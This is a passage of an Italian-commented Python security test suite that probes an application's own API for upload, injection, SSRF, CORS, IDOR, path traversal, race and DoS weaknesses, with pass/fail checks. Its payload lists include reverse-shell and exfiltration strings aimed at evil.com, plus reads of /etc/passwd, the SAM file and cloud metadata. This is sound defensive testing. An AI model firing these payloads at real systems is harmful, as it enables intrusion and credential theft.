            test_pass(f"Upload file non-immagine rifiutato → {resp.status_code}")
        elif resp.status_code == 200:
            test_fail("Upload file non-immagine (.py) accettato — manca validazione MIME type!")
        else:
            test_info(f"Upload file non-immagine → {resp.status_code}")
    except Exception as e:
        test_info(f"Upload non-immagine: {e}")

    # 10.3 Upload con content-type falsificato
    try:
        exe_content = b"MZ" + os.urandom(500)  # Simula header PE/EXE
        resp = requests.post(
            f"{SERVER_URL}/signatures/security_test_user_fake",
            headers=auth_header(admin_token),
            files={"file": ("firma.png", exe_content, "image/png")},  # Content-type falsificato
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (400, 415):
            test_pass(f"Upload con MIME falsificato rifiutato → {resp.status_code}")
        elif resp.status_code == 200:
            test_fail("Upload con content-type falsificato accettato — manca validazione magic bytes!")
        else:
            test_info(f"Upload MIME falsificato → {resp.status_code}")
    except Exception as e:
        test_info(f"Upload MIME falsificato: {e}")

    # 10.4 Upload senza file
    try:
        resp = requests.post(
            f"{SERVER_URL}/signatures/security_test_user_fake",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 422:
            test_pass("Upload senza file → 422 Validation Error")
        else:
            test_info(f"Upload senza file → {resp.status_code}")
    except Exception as e:
        test_info(f"Upload senza file: {e}")


# ============================================================
# TEST 11: HARD DELETE SICUREZZA (path traversal, tabelle invalide)
# ============================================================
def test_hard_delete_security(admin_token):
    print_header("TEST 11: Hard Delete — Path Traversal & Tabelle invalide")

    if not admin_token:
        test_skip("Token admin necessario per test hard delete")
        return

    # 11.1 Tabella non consentita
    invalid_tables = [
        "users",                          # Non deve essere nella whitelist
        "hard_deletes",                   # Tabella interna
        "pg_catalog.pg_user",             # Tabella di sistema PostgreSQL
        "information_schema.tables",      # Schema info
        "customers; DROP TABLE users;--", # SQL injection nel path
    ]

    for table in invalid_tables:
        try:
            resp = requests.delete(
                f"{SERVER_URL}/admin/deleted-data/{table}/1",
                headers=auth_header(admin_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code in (400, 404, 422):
                test_pass(f"Hard delete tabella '{table[:35]}' → {resp.status_code} (bloccato)")
            elif resp.status_code == 500:
                test_warn(f"Hard delete tabella '{table[:35]}' → 500 (gestire meglio)")
            else:
                test_fail(f"Hard delete tabella '{table[:35]}' → {resp.status_code}")
        except Exception as e:
            test_info(f"Hard delete '{table[:25]}': {e}")

    # 11.2 ID non numerico
    try:
        resp = requests.delete(
            f"{SERVER_URL}/admin/deleted-data/customers/abc",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (400, 422):
            test_pass(f"Hard delete con ID non numerico → {resp.status_code}")
        else:
            test_info(f"Hard delete ID 'abc' → {resp.status_code}")
    except Exception as e:
        test_info(f"Hard delete ID non numerico: {e}")

    # 11.3 ID negativo
    try:
        resp = requests.delete(
            f"{SERVER_URL}/admin/deleted-data/customers/-1",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (400, 404, 422):
            test_pass(f"Hard delete con ID negativo → {resp.status_code}")
        else:
            test_info(f"Hard delete ID -1 → {resp.status_code}")
    except Exception as e:
        test_info(f"Hard delete ID negativo: {e}")


# ============================================================
# TEST 12: XSS E HEADER INJECTION
# ============================================================
def test_xss_and_injection():
    print_header("TEST 12: XSS, SSTI e Header Injection (Aggressivo)")

    # 12.1 XSS nel campo username — payload estesi
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "admin<img src=x onerror=alert(1)>",
        "admin\"><svg/onload=alert(1)>",
        # Polyglot XSS
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
        # Event handlers
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        # Encoding bypass
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<svg/onload=\"alert(1)\">",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # DOM-based
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
    ]
    # 12.1b SSTI (Server-Side Template Injection)
    ssti_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "#{7*7}",
    ]

    for payload in xss_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": payload, "password": "test"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            ct = resp.headers.get("content-type", "")
            body = resp.text

            # Il server deve rispondere in JSON, non in HTML
            if "text/html" in ct and payload in body:
                test_fail(f"Possibile XSS riflesso! Payload: '{payload[:30]}' ritornato in HTML")
            elif "application/json" in ct:
                test_pass(f"XSS bloccato: risposta JSON, non HTML. Payload: '{payload[:30]}'")
            else:
                test_pass(f"XSS bloccato: Content-Type={ct}")
        except Exception as e:
            test_info(f"XSS test: {e}")

    # 12.1c SSTI (Server-Side Template Injection)
    for payload in ssti_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": payload, "password": "test"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            body = resp.text
            # Se il template viene eseguito, '49' appare (7*7)
            if "49" in body and "{{" not in body:
                test_fail(f"SSTI POSSIBILE! Payload '{payload}' eseguito → '49' in risposta")
            elif "config" in body.lower() and "secret" in body.lower():
                test_fail(f"SSTI CRITICO! Config esposta con payload '{payload}'")
            else:
                test_pass(f"SSTI bloccato: '{payload[:30]}'")
        except Exception as e:
            test_info(f"SSTI test: {e}")

    # 12.2 Header injection (CRLF) — varianti multiple
    crlf_payloads = [
        ("admin\r\nX-Injected: true", "x-injected"),
        ("admin\r\nSet-Cookie: session=hacked", "set-cookie"),
        ("admin%0d%0aX-Injected:%20true", "x-injected"),
        ("admin\nX-Injected: true", "x-injected"),
    ]
    for payload, header_check in crlf_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": payload, "password": "test"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if header_check not in resp.headers:
                test_pass(f"CRLF injection bloccata: '{payload[:35]}'")
            else:
                test_fail(f"CRLF injection POSSIBILE: '{payload[:35]}' → header {header_check} iniettato!")
        except Exception as e:
            test_info(f"CRLF injection: {e}")


# ============================================================
# TEST 13: USER MANAGEMENT EDGE CASES
# ============================================================
def test_user_management(admin_token, admin_username, skip_destructive):
    print_header("TEST 13: Gestione Utenti — Edge Cases")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    # 13.1 Admin non può eliminare se stesso
    try:
        resp = requests.delete(
            f"{SERVER_URL}/users/{admin_username}",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 400:
            test_pass("Admin non può eliminare se stesso → 400")
        else:
            test_fail(f"Admin auto-eliminazione → {resp.status_code} (atteso 400)")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 13.2 Eliminazione utente inesistente
    try:
        resp = requests.delete(
            f"{SERVER_URL}/users/utente_che_non_esiste_mai_xyz",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 404:
            test_pass("Eliminazione utente inesistente → 404")
        else:
            test_info(f"Eliminazione utente inesistente → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")

    # 13.3 Creazione utente con username troppo lungo / caratteri speciali
    if not skip_destructive:
        weird_usernames = [
            "a" * 500,                    # Username molto lungo
            "user<script>",                # XSS nel username
            "user'; DROP TABLE users;--",  # SQLi nel username
            "",                            # Username vuoto
        ]
        for uname in weird_usernames:
            try:
                resp = requests.post(
                    f"{SERVER_URL}/users",
                    headers=auth_header(admin_token),
                    json={"username": uname, "password": "Test123!Pass", "role": "technician"},
                    verify=SSL_VERIFY, timeout=TIMEOUT
                )
                if resp.status_code in (400, 422):
                    test_pass(f"Username '{uname[:25]}...' rifiutato → {resp.status_code}")
                elif resp.status_code == 200:
                    test_fail(f"Username '{uname[:25]}...' accettato — manca validazione!")
                    # Cleanup: elimina l'utente di test
                    try:
                        requests.delete(
                            f"{SERVER_URL}/users/{uname}",
                            headers=auth_header(admin_token),
                            verify=SSL_VERIFY, timeout=TIMEOUT
                        )
                    except Exception:
                        pass
                elif resp.status_code == 500:
                    test_fail(f"Username '{uname[:25]}...' causa errore 500!")
                else:
                    test_info(f"Username '{uname[:25]}...' → {resp.status_code}")
            except Exception as e:
                test_info(f"Username test: {e}")
    else:
        test_skip("Test creazione utenti saltati (--skip-destructive)")

    # 13.4 Aggiornamento utente con ruolo non valido
    try:
        resp = requests.put(
            f"{SERVER_URL}/users/{admin_username}",
            headers=auth_header(admin_token),
            json={"role": "superadmin_hackerato"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (400, 422):
            test_pass(f"Ruolo non valido rifiutato → {resp.status_code}")
        elif resp.status_code == 200:
            test_fail("Ruolo 'superadmin_hackerato' accettato — manca whitelist ruoli!")
            # Ripristina il ruolo admin
            try:
                requests.put(
                    f"{SERVER_URL}/users/{admin_username}",
                    headers=auth_header(admin_token),
                    json={"role": "admin"},
                    verify=SSL_VERIFY, timeout=TIMEOUT
                )
            except Exception:
                pass
        elif resp.status_code == 500:
            test_fail(f"Ruolo non valido causa errore 500!")
        else:
            test_info(f"Ruolo non valido → {resp.status_code}")
    except Exception as e:
        test_fail(f"Errore: {e}")


# ============================================================
# TEST 14: ENDPOINT INESISTENTI E METODI HTTP ERRATI
# ============================================================
def test_http_methods():
    print_header("TEST 14: Metodi HTTP non consentiti")

    method_tests = [
        ("PATCH", "/users/admin", "PATCH su /users"),
        ("OPTIONS", "/sync", "OPTIONS su /sync"),
        ("PUT", "/sync", "PUT su /sync (dovrebbe essere POST)"),
        ("DELETE", "/sync", "DELETE su /sync"),
        ("POST", "/users/admin", "POST su /users/{username}"),
        ("PUT", "/token", "PUT su /token"),
    ]

    for method, path, name in method_tests:
        try:
            resp = requests.request(
                method, f"{SERVER_URL}{path}",
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 405:
                test_pass(f"{name} → 405 Method Not Allowed")
            elif resp.status_code == 401:
                test_pass(f"{name} → 401 (richiede auth prima di metodo check)")
            else:
                test_info(f"{name} → {resp.status_code}")
        except Exception as e:
            test_info(f"{name}: {e}")


# ============================================================
# TEST 15: SSRF (Server-Side Request Forgery)
# ============================================================
def test_ssrf(admin_token):
    print_header("TEST 15: SSRF (Server-Side Request Forgery)")

    if not admin_token:
        test_skip("Token admin necessario per test SSRF")
        return

    ssrf_payloads = [
        "http://127.0.0.1:22",
        "http://localhost:5432",
        "http://0.0.0.0:8000",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",           # GCP metadata
        "http://[::1]:8000",
        "http://2130706433",  # 127.0.0.1 in decimal
        "http://0x7f000001",  # 127.0.0.1 in hex
        "file:///etc/passwd",
        "file:///c:/windows/system32/config/sam",
        "gopher://127.0.0.1:5432/",
        "dict://127.0.0.1:5432/",
    ]

    # Testa SSRF nei campi dati del sync
    for payload in ssrf_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/sync",
                headers=auth_header(admin_token),
                json={
                    "last_sync_timestamp": None,
                    "changes": {
                        "customers": [{
                            "uuid": str(uuid.uuid4()),
                            "name": f"_SECTEST_ {payload}",
                            "email": payload,
                            "website": payload,
                            "last_modified": datetime.now().isoformat(),
                            "is_deleted": True,
                            "is_synced": True
                        }]
                    }
                },
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            # Il server non deve effettuare richieste verso gli URL
            if resp.status_code != 500:
                test_pass(f"SSRF payload gestito senza crash: '{payload[:40]}'")
            else:
                test_warn(f"SSRF payload '{payload[:40]}' → 500")
        except Exception as e:
            test_info(f"SSRF test: {e}")


# ============================================================
# TEST 16: CORS Misconfiguration
# ============================================================
def test_cors():
    print_header("TEST 16: CORS Misconfiguration")

    malicious_origins = [
        "https://evil.com",
        "https://attacker.example.com",
        "null",
        f"{SERVER_URL}.evil.com",
        "http://localhost:3000",
    ]

    for origin in malicious_origins:
        try:
            resp = requests.options(
                f"{SERVER_URL}/sync",
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "Authorization, Content-Type"
                },
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")

            if acao == "*" and acac.lower() == "true":
                test_fail(f"CORS CRITICO: Allow-Origin=* + Allow-Credentials=true con Origin '{origin}'")
            elif acao == origin:
                test_warn(f"CORS riflette Origin arbitrario '{origin}' → possibile misconfiguration")
            elif not acao or acao not in (origin, "*"):
                test_pass(f"CORS corretto: Origin '{origin}' non riflesso")
            else:
                test_info(f"CORS: Origin '{origin}' → ACAO='{acao}'")
        except Exception as e:
            test_info(f"CORS test: {e}")


# ============================================================
# TEST 17: Host Header Injection
# ============================================================
def test_host_header_injection():
    print_header("TEST 17: Host Header Injection")

    parsed_url = urlparse(SERVER_URL)
    original_host = parsed_url.hostname

    injection_hosts = [
        "evil.com",
        "evil.com:8000",
        f"{original_host}@evil.com",
        f"{original_host}\r\nX-Injected: true",
        "127.0.0.1",
        "localhost",
    ]

    for injected_host in injection_hosts:
        try:
            resp = requests.get(
                f"{SERVER_URL}/",
                headers={"Host": injected_host},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            body = resp.text.lower()
            # Il server non deve riflettere il Host header iniettato nel body
            if injected_host.lower().split("\r")[0] in body and "evil" in injected_host:
                test_fail(f"Host header injection riflesso nel body! Host: '{injected_host}'")
            else:
                test_pass(f"Host header '{injected_host[:35]}' non riflesso")
        except Exception as e:
            test_info(f"Host header injection: {e}")


# ============================================================
# TEST 18: IDOR (Insecure Direct Object Reference)
# ============================================================
def test_idor(admin_token):
    print_header("TEST 18: IDOR (Insecure Direct Object Reference)")

    if not admin_token:
        test_skip("Token admin necessario per test IDOR")
        return

    # Crea un utente temporaneo per testare accesso cross-utente
    test_user = f"_sectest_idor_{int(time.time())}"
    test_pass_val = "IdorTest2026!Sec"
    user_token = None

    try:
        resp = requests.post(
            f"{SERVER_URL}/users",
            headers=auth_header(admin_token),
            json={"username": test_user, "password": test_pass_val, "role": "technician"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 200:
            time.sleep(1)
            user_token = login(test_user, test_pass_val)
    except Exception:
        pass

    if user_token:
        # 18.1 Utente non può accedere alla firma di un altro
        try:
            resp = requests.get(
                f"{SERVER_URL}/signatures/admin",
                headers=auth_header(user_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("IDOR bloccato: utente non può scaricare firma di admin")
            elif resp.status_code == 200:
                test_fail("IDOR POSSIBILE: utente scarica firma di admin!")
            else:
                test_info(f"IDOR firma → {resp.status_code}")
        except Exception as e:
            test_info(f"IDOR firma: {e}")

        # 18.2 Utente non può modificare password di un altro
        try:
            resp = requests.put(
                f"{SERVER_URL}/users/admin",
                headers=auth_header(user_token),
                json={"password": "HackedPassword123!"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("IDOR bloccato: utente non può cambiare password admin")
            elif resp.status_code == 200:
                test_fail("IDOR CRITICO: utente modifica password admin!")
            else:
                test_info(f"IDOR password → {resp.status_code}")
        except Exception as e:
            test_info(f"IDOR password: {e}")

        # 18.3 Utente non può caricare firma per un altro
        try:
            fake_img = b'\x89PNG\r\n\x1a\n' + os.urandom(100)
            resp = requests.post(
                f"{SERVER_URL}/signatures/admin",
                headers=auth_header(user_token),
                files={"file": ("firma.png", fake_img, "image/png")},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code == 403:
                test_pass("IDOR bloccato: utente non può caricare firma per admin")
            elif resp.status_code == 200:
                test_fail("IDOR CRITICO: utente carica firma per admin!")
            else:
                test_info(f"IDOR upload firma → {resp.status_code}")
        except Exception as e:
            test_info(f"IDOR upload: {e}")

        # Cleanup
        try:
            requests.delete(
                f"{SERVER_URL}/users/{test_user}",
                headers=auth_header(admin_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
        except Exception:
            pass
    else:
        test_skip("Impossibile creare utente IDOR temporaneo")


# ============================================================
# TEST 19: Command Injection
# ============================================================
def test_command_injection(admin_token):
    print_header("TEST 19: Command/OS Injection")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    cmd_payloads = [
        "; ls -la /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "; ping -c 3 127.0.0.1",
        "& dir C:\\",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "'; exec('import os; os.system(\"id\")');#",
        "__import__('os').system('id')",
        "; curl http://evil.com/$(whoami)",
        "|nc -e /bin/sh 127.0.0.1 4444",
        "$(curl http://169.254.169.254/latest/meta-data/)",
    ]

    for payload in cmd_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/sync",
                headers=auth_header(admin_token),
                json={
                    "last_sync_timestamp": None,
                    "changes": {
                        "customers": [{
                            "uuid": str(uuid.uuid4()),
                            "name": f"_SECTEST_ {payload}",
                            "last_modified": datetime.now().isoformat(),
                            "is_deleted": True,
                            "is_synced": True
                        }]
                    }
                },
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            body = resp.text.lower()
            dangerous_indicators = ["root:", "uid=", "gid=", "/bin/", "windows", "system32",
                                    "volume serial", "directory of"]
            leaks = [ind for ind in dangerous_indicators if ind in body]
            if leaks:
                test_fail(f"COMMAND INJECTION POSSIBILE! Payload '{payload[:30]}' → output: {leaks}")
            elif resp.status_code != 500:
                test_pass(f"CMD injection bloccata: '{payload[:35]}'")
            else:
                test_warn(f"CMD injection causa 500: '{payload[:35]}'")
        except Exception as e:
            test_info(f"CMD injection: {e}")


# ============================================================
# TEST 20: Path Traversal (Avanzato)
# ============================================================
def test_path_traversal(admin_token):
    print_header("TEST 20: Path Traversal (Aggressivo)")

    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/etc/passwd%00.png",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        "..%00/..%00/..%00/etc/passwd",
        "/proc/self/environ",
        "/proc/self/cmdline",
    ]

    # Via username nelle firme
    for payload in traversal_payloads:
        try:
            resp = requests.get(
                f"{SERVER_URL}/signatures/{quote(payload, safe='')}",
                headers=auth_header(admin_token) if admin_token else {},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            body = resp.text.lower()
            if "root:" in body or "[boot loader]" in body or "password" in body:
                test_fail(f"PATH TRAVERSAL POSSIBILE! Payload: '{payload[:35]}'")
            elif resp.status_code in (400, 401, 403, 404, 422):
                test_pass(f"Path traversal bloccato: '{payload[:35]}' → {resp.status_code}")
            else:
                test_info(f"Path traversal '{payload[:35]}' → {resp.status_code}")
        except Exception as e:
            test_info(f"Path traversal: {e}")

    # Via hard delete endpoint
    if admin_token:
        for payload in ["../users", "..%2Fusers", "customers/../users"]:
            try:
                resp = requests.delete(
                    f"{SERVER_URL}/admin/deleted-data/{quote(payload, safe='')}/1",
                    headers=auth_header(admin_token),
                    verify=SSL_VERIFY, timeout=TIMEOUT
                )
                if resp.status_code in (400, 404, 422):
                    test_pass(f"Path traversal in hard delete bloccato: '{payload}'")
                else:
                    test_warn(f"Path traversal hard delete '{payload}' → {resp.status_code}")
            except Exception as e:
                test_info(f"Path traversal hard delete: {e}")


# ============================================================
# TEST 21: Race Conditions (TOCTOU)
# ============================================================
def test_race_conditions(admin_token):
    print_header("TEST 21: Race Conditions (TOCTOU)")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    # 21.1 Creazione utente concorrente (stesso username)
    test_info("Test creazione utente concorrente (10 richieste parallele)...")
    race_user = f"_sectest_race_{int(time.time())}"
    results_list = []

    def create_user_race():
        try:
            resp = requests.post(
                f"{SERVER_URL}/users",
                headers=auth_header(admin_token),
                json={"username": race_user, "password": "RaceTest2026!", "role": "technician"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            results_list.append(resp.status_code)
        except Exception:
            results_list.append(-1)

    threads = [threading.Thread(target=create_user_race) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=20)

    success_count = results_list.count(200)
    if success_count <= 1:
        test_pass(f"Race condition gestita: solo {success_count} creazione riuscita su {len(results_list)}")
    else:
        test_fail(f"Race condition: {success_count} utenti creati con stesso username!")

    # Cleanup
    try:
        requests.delete(
            f"{SERVER_URL}/users/{race_user}",
            headers=auth_header(admin_token),
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
    except Exception:
        pass

    # 21.2 Sync concorrente con stessi record
    test_info("Test sync concorrente (5 richieste parallele)...")
    sync_results = []
    test_uuid = str(uuid.uuid4())

    def sync_race(idx):
        try:
            resp = requests.post(
                f"{SERVER_URL}/sync",
                headers=auth_header(admin_token),
                json={
                    "last_sync_timestamp": None,
                    "changes": {
                        "customers": [{
                            "uuid": test_uuid,
                            "name": f"_SECTEST_ Race Customer {idx}",
                            "last_modified": datetime.now().isoformat(),
                            "is_deleted": True,
                            "is_synced": True
                        }]
                    }
                },
                verify=SSL_VERIFY, timeout=30
            )
            sync_results.append(resp.status_code)
        except Exception:
            sync_results.append(-1)

    threads = [threading.Thread(target=sync_race, args=(i,)) for i in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)

    error_count = sync_results.count(500)
    if error_count == 0:
        test_pass(f"Sync concorrente gestita senza errori 500: {sync_results}")
    else:
        test_warn(f"Sync concorrente: {error_count} errori 500 su {len(sync_results)}")


# ============================================================
# TEST 22: Encoding & Unicode Attacks
# ============================================================
def test_encoding_attacks():
    print_header("TEST 22: Encoding & Unicode Attacks")

    encoding_payloads = [
        # Overlong UTF-8
        "admin\xc0\xae\xc0\xae",
        # NULL byte
        "admin\x00",
        "admin\x00.txt",
        # Fullwidth unicode (admin in fullwidth)
        "\uff41\uff44\uff4d\uff49\uff4e",
        # Right-to-left override
        "admin\u202Efdp.exe",
        # Zero-width characters
        "admin\u200B\u200B",
        "ad\u200Cmin",
        # Combining characters
        "a\u0308dmin",
        # Very long unicode
        "\U0001F600" * 1000,
    ]

    for payload in encoding_payloads:
        try:
            resp = requests.post(
                f"{SERVER_URL}/token",
                data={"username": payload, "password": "test"},
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
            if resp.status_code in (401, 400, 422, 429):
                test_pass(f"Encoding attack gestito: '{repr(payload)[:40]}' → {resp.status_code}")
            elif resp.status_code == 200:
                test_fail(f"Encoding attack BYPASS! '{repr(payload)[:40]}' → login riuscito!")
            elif resp.status_code == 500:
                test_fail(f"Encoding attack causa crash: '{repr(payload)[:40]}' → 500")
            else:
                test_info(f"Encoding: '{repr(payload)[:40]}' → {resp.status_code}")
        except Exception as e:
            test_info(f"Encoding attack: {e}")


# ============================================================
# TEST 23: Token Reuse After Password Change
# ============================================================
def test_token_reuse_after_password_change(admin_token, admin_username, admin_password):
    print_header("TEST 23: Token Reuse After Password Change")

    if not admin_token or not admin_username or not admin_password:
        test_skip("Credenziali admin necessarie")
        return

    # Crea utente temporaneo
    test_user = f"_sectest_tokenreuse_{int(time.time())}"
    old_pass = "OldPass2026!Sec"
    new_pass = "NewPass2026!Sec"

    try:
        resp = requests.post(
            f"{SERVER_URL}/users",
            headers=auth_header(admin_token),
            json={"username": test_user, "password": old_pass, "role": "technician"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code != 200:
            test_skip("Impossibile creare utente temporaneo")
            return

        time.sleep(1)
        old_token = login(test_user, old_pass)
        if not old_token:
            test_skip("Impossibile ottenere token")
            return

        # Verifica che il vecchio token funzioni
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(old_token),
            json={"last_sync_timestamp": None, "changes": {}},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code != 200:
            test_skip(f"Token non funziona: {resp.status_code}")
            return

        # Cambia password tramite admin
        requests.put(
            f"{SERVER_URL}/users/{test_user}",
            headers=auth_header(admin_token),
            json={"password": new_pass},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )

        # Prova a usare il vecchio token
        time.sleep(1)
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(old_token),
            json={"last_sync_timestamp": None, "changes": {}},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 401:
            test_pass("Vecchio token invalidato dopo cambio password")
        elif resp.status_code == 200:
            test_warn("Vecchio token ANCORA VALIDO dopo cambio password (JWT stateless — noto, ma considerare blacklist)")
        else:
            test_info(f"Token post-cambio password → {resp.status_code}")

    except Exception as e:
        test_info(f"Token reuse test: {e}")
    finally:
        # Cleanup
        try:
            requests.delete(
                f"{SERVER_URL}/users/{test_user}",
                headers=auth_header(admin_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
        except Exception:
            pass


# ============================================================
# TEST 24: Mass Assignment / Parameter Pollution
# ============================================================
def test_mass_assignment(admin_token):
    print_header("TEST 24: Mass Assignment & Parameter Pollution")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    # 24.1 Creazione utente con campi extra (es. is_admin, is_superuser)
    test_user = f"_sectest_mass_{int(time.time())}"
    try:
        resp = requests.post(
            f"{SERVER_URL}/users",
            headers=auth_header(admin_token),
            json={
                "username": test_user,
                "password": "MassTest2026!",
                "role": "technician",
                # Campi extra che NON dovrebbero essere accettati
                "is_admin": True,
                "is_superuser": True,
                "hashed_password": "$argon2id$v=19$m=65536,t=3,p=4$fake",
                "id": 1,
            },
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("role") == "technician":
                test_pass("Mass assignment gestito: ruolo non scalato")
            else:
                test_fail(f"Mass assignment: ruolo cambiato a '{data.get('role')}'!")
        elif resp.status_code in (400, 422):
            test_pass(f"Mass assignment bloccato → {resp.status_code}")
        else:
            test_info(f"Mass assignment → {resp.status_code}")
    except Exception as e:
        test_info(f"Mass assignment: {e}")
    finally:
        try:
            requests.delete(
                f"{SERVER_URL}/users/{test_user}",
                headers=auth_header(admin_token),
                verify=SSL_VERIFY, timeout=TIMEOUT
            )
        except Exception:
            pass

    # 24.2 HTTP Parameter Pollution
    try:
        resp = requests.post(
            f"{SERVER_URL}/token",
            data="username=admin&username=hacker&password=test&password=hack",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            verify=SSL_VERIFY, timeout=TIMEOUT
        )
        if resp.status_code in (401, 422, 429):
            test_pass(f"Parameter pollution gestita → {resp.status_code}")
        elif resp.status_code == 200:
            test_warn("Parameter pollution: login riuscito con parametri duplicati")
        else:
            test_info(f"Parameter pollution → {resp.status_code}")
    except Exception as e:
        test_info(f"Parameter pollution: {e}")


# ============================================================
# TEST 25: Denial of Service Patterns
# ============================================================
def test_dos_patterns(admin_token):
    print_header("TEST 25: Denial of Service Patterns")

    if not admin_token:
        test_skip("Token admin necessario")
        return

    # 25.1 JSON Bomb (deeply nested)
    test_info("Test JSON bomb (nesting profondo)...")
    try:
        # Crea un JSON annidato 100 livelli
        bomb = {"a": "b"}
        for _ in range(100):
            bomb = {"nested": bomb}
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={"last_sync_timestamp": None, "changes": bomb},
            verify=SSL_VERIFY, timeout=15
        )
        if resp.status_code in (400, 422):
            test_pass(f"JSON bomb (nesting) rifiutato → {resp.status_code}")
        elif resp.status_code == 200:
            test_warn("JSON bomb accettato (server resiliente ma meglio limitare)")
        elif resp.status_code == 500:
            test_warn("JSON bomb causa errore 500")
        else:
            test_info(f"JSON bomb → {resp.status_code}")
    except requests.exceptions.Timeout:
        test_fail("JSON bomb causa TIMEOUT — possibile DoS!")
    except Exception as e:
        test_info(f"JSON bomb: {e}")

    # 25.2 Payload con moltissimi record
    test_info("Test payload con 10.000 record...")
    try:
        many_records = [{
            "uuid": str(uuid.uuid4()),
            "name": f"DoS Customer {i}",
            "last_modified": datetime.now().isoformat(),
            "is_deleted": True,  # Marcati come eliminati per non inquinare il DB
            "is_synced": True
        } for i in range(10000)]
        start = time.time()
        resp = requests.post(
            f"{SERVER_URL}/sync",
            headers=auth_header(admin_token),
            json={
                "last_sync_timestamp": None,
                "changes": {"customers": many_records}
            },
            verify=SSL_VERIFY, timeout=60
        )
        elapsed = time.time() - start
        if resp.status_code == 413:
            test_pass(f"10k record rifiutati → 413 Payload Too Large")
        elif resp.status_code in (200, 400):
            if elapsed > 30:
                test_warn(f"10k record: {elapsed:.1f}s — potenziale slow DoS")
            else:
                test_pass(f"10k record gestiti in {elapsed:.1f}s → {resp.status_code}")
        else:
            test_info(f"10k record → {resp.status_code} in {elapsed:.1f}s")
    except requests.exceptions.Timeout:
        test_warn("10k record causa TIMEOUT (possibile DoS, ma timeout protegge)")
    except Exception as e:
        test_info(f"10k record: {e}")

    # 25.3 Payload con campi molto lunghi
    test_info("Test campo con stringa da 10MB...")
    try:
